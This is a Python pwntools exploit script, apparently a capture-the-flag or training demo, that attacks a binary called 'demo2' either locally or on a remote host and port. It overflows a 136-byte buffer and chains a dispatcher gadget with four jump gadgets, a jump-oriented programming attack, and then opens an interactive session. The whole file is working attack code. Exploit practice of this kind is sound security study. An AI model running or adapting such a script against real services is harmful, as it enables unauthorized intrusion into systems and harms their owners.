#!/usr/bin/python 
#coding: utf-8
__author__ = "TaQini"
from pwn import *
import sys
# context.log_level = 'debug'

if len(sys.argv)>2:
    addr = sys.argv[1]
    port = int(sys.argv[2])   
    p = remote(addr,port)
else:
    p = process('./demo2')

elf  = ELF("./demo2")

# some func leak libc
printf = u64(p.recv(8))
log.info("printf= " + hex(printf))
p.recvuntil("input\n")

# jmp gadget
dis = 0x00000000004005b7
g1 = 0x000000000040056b
g2 = 0x0000000000400582
g3 = 0x000000000040059c
g4 = 0x00000000004005ae

buflen = 136
payload = ''.ljust(buflen,'\0')
payload += p64(dis)
dispatch = ''
dispatch += p64(g1)
dispatch += p64(g2)
dispatch += p64(g3)
dispatch += p64(g4)
payload += dispatch

# gdb.attach(p)
p.sendline(payload)

p.interactive()
